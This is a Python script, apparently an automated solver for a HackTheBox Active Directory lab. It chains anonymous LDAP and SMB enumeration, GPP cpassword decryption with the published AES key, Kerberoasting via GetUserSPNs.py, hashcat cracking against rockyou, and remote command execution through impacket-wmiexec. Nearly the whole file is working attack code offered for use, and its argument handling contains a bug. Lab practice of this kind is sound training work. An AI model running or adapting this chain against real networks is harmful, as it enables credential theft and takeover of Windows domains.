import time
import coloredlogs, logging
import argparse
from io import BytesIO
from os import path
import subprocess

from impacket.smbconnection import SMBConnection, SessionError
from tempfile import mkdtemp, mkstemp, gettempdir
from gitleaks_py import gitleaks_command as gl_c, gitleaks_model as gl_m
import requests
from defusedxml import ElementTree
from Crypto.Cipher import AES
import base64

import ldap3
import magic
import zipfile

import re

# https://app.hackthebox.com/machines/Active

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG')

parser = argparse.ArgumentParser(prog='WindowsSolver')
parser.add_argument('--ip', help='target IP', required=True)
parser.add_argument('--usernames', help='Initial list of usernames')
parser.add_argument('--passwords', help='Initial list of passwords')
parser.add_argument('--credentials', help='Initial list of credentials')
parser.add_argument('--credential', help='Initial credential')

hash_file_name = path.join(gettempdir(), "hash.txt")

_fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()

with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
    cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)

usernames = set()
passwords = set()

credentials = {}

def save_creds(username, password):
    credentials[username] = password

ad_infos = {}

def query_ldap_ad(ip):
    server = ldap3.Server(f"ldap://{ip}", get_info=ldap3.ALL)
    connection = ldap3.Connection(server, user="", password="", auto_bind=True)
    info = server.info
    ad_infos['naming_context'] = info.naming_contexts[0]
    ad_infos['domain'] = info.other['ldapServiceName'][0].split(':')[0]

def decrypt(cpass):
    """
        From https://github.com/t0thkr1s/gpp-decrypt/blob/c71c7a6c3c8d251bf1b66050a00b9bb53362d326/gpp-decrypt.py#L21C1-L30C65
    """
    padding = '=' * (4 - len(cpass) % 4)
    epass = cpass + padding
    decoded = base64.b64decode(epass)
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = b'\x00' * 16
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(decoded).decode(encoding='ascii').strip()

def parse_groups_xml(output):
    tree = ElementTree.fromstring(output)
    user = tree.find('User')
    if user is not None:
        properties = user.find('Properties')
        username = properties.attrib.get('userName')
        cpass = properties.attrib.get('cpassword')
        decrypted_pass = decrypt(cpass).encode().decode("utf-16")
        logger.warning(f"New credentials found : {username}:{decrypted_pass}")
        save_creds(username, decrypted_pass)

def list_files_in_share(connection, share_name, path, depth):
    tmp_dir = mkdtemp(prefix="ws_")
    for f in connection.listPath(share_name, path + "/*"):
        name = f.get_longname()
        if f.is_directory() and name in ['.', '..']:
             continue

        logger.warning("  "*depth +  "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), name))
        if f.is_directory():
            list_files_in_share(connection, share_name, path + "/" + name, depth + 1)
        else:
            fh = BytesIO()
            connection.getFile(share_name, path + "/" + name, fh.write)
            output = fh.getvalue()
            current_file_name = tmp_dir + "/" + name
            with open(current_file_name, "wb") as f_smb:
                f_smb.write(output)

            logger.debug(f"Type of {current_file_name} " + magic.from_file(tmp_dir + "/" + name))

            if name == "Groups.xml":
                parse_groups_xml(output)
            elif magic.from_file(current_file_name).startswith("Zip archive data"):
                with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
                    zip_ref.extractall(current_file_name + "_extract")

    logger.info("Scanning " + tmp_dir)
    logger.info(gl_c.detect(GITLEAKS_DEFAULT_CONFIG_FILE, tmp_dir))


def ldap_find_kerberoasting(ip, domain, username, password):
    escaped_username = username.replace("\\", "/")
    get_user_spns_command = ["GetUserSPNs.py", domain + "/" + escaped_username + ":" + password, "-dc-ip", ip, "-request"]
    print(get_user_spns_command)
    result = subprocess.run(get_user_spns_command, capture_output=True, text=True, check=True)
    output = result.stdout
    
    # GetUserSPNs.py -outputfile /tmp/hash.txt
    with open(hash_file_name, "a") as hash_file:
        for line in output.splitlines():
            if line.startswith("$krb5tgs$"):
                hash_file.write(line + "\n")

def crack_hashes():
    logger.warning("Hashcat in progress...")
    hashcat_command = ["hashcat", "-a", "0", "-m", "13100", hash_file_name, "/usr/share/wordlists/rockyou.txt", "--quiet"]
    result = subprocess.run(hashcat_command, check=True, capture_output=True)
    output = result.stdout
    logger.info(output)

    for line in output.split(b"\n"):
        if line.startswith(b"$krb5tgs$"):
            components = line.split(b"$")
            username = components[3].decode()
            if username[0] == '*':
                username = username[1:]
            password = b":".join(components[-1].split(b":")[1:])
            logger.warning(f"Found new creds: {username}:{password}")
            save_creds(username, password.decode())

def test_wmiexec(ip, domain, username, password):
    wmiexec_command = ["impacket-wmiexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
    result = subprocess.run(wmiexec_command, capture_output=True)
    if result.returncode == 0:
        logger.warning(f"Getting access to shell with {username}:{password}")
        output = result.stdout
        logger.info(output.decode())

def list_shares(ip, user = "", password = ""):
    connection = SMBConnection(remoteName = ip, remoteHost = ip)
    connection.login(user, password)

    logger.info("Listing shares")
    shares = connection.listShares()
    logger.info(f"Number of shares found: {len(shares)}")
    for s in shares:
        share_name = s.fields['shi1_netname'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
        share_comment = s.fields['shi1_remark'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
        base_msg = " %r (%r) : " %(share_name, share_comment)
        try:
            connection.connectTree(share_name)
            logger.warning(base_msg + "Readable")
            list_files_in_share(connection, share_name, '', depth = 0)
        except SessionError as e:
            logger.info(base_msg + "Not readable")
            logger.debug(e)

def sync_time(ip):
    logger.info("Syncing time with target...")
    sync_command = ["sudo", "rdate", "-vn", ip]
    result = subprocess.run(sync_command, capture_output=True)
    logger.debug(result.stdout.decode())
    if result.returncode != 0:
        logger.error("Fail to sync date with target, it might block communication with KRB service")
        logger.error("Add '<username> ALL=(root) /usr/sbin/rdate -vn *' to /etc/sudoers to allow the script to update it automatically")

def list_users(ip, domain, username, password):
    logger.info("Listing RPC uers...")
    regex = r".*: .*\\(.*) \((.*)\)"
    sid_command = ["impacket-lookupsid", f"{domain}/{username}:{password}@{ip}"]
    result = subprocess.run(sid_command, capture_output=True)
    if result.returncode == 0:
        output = result.stdout.decode()
        matches = re.finditer(regex, output, re.MULTILINE)

        for _matchNum, match in enumerate(matches, start=1):
            username = match.group(1)
            sid_type = match.group(2)
            if sid_type == "SidTypeUser":
                logger.info(f"New username discovered: {username}")
                usernames.add(username)
    else:
        print(result)

if __name__ =="__main__":
    args = parser.parse_args()
    ip = args.ip

    if credentials in args.credentials and ":" in credentials:
        username = credentials.split(":")[0]
        password = ":".join(credentials.split(":")[1:])
        save_creds(username, password)

    sync_time(ip)

    query_ldap_ad(ip)

    domain = ad_infos['domain']
    logger.warning(f"Domain: {domain}")


    for username, password in [('',''), ('guest', ''), *credentials.items()]:
        list_users(ip, domain, username, password)

    for username in ['', 'guest', *usernames]:
        try:
            list_shares(ip, user=username, password='')
        except:
            logger.info(f"Unable to list SMB with {username}")

    for username, password in [('',''), ('guest', ''), *credentials.items()]:
        try:
            list_shares(ip, user=username, password=password)
        except:
            logger.info(f"Unable to list SMB with {username}:{password}")

    for username, password in credentials.items():
        ldap_find_kerberoasting(ip, domain, username, password)

    crack_hashes()

    for username, password in credentials.items():
        test_wmiexec(ip, domain, username, password)



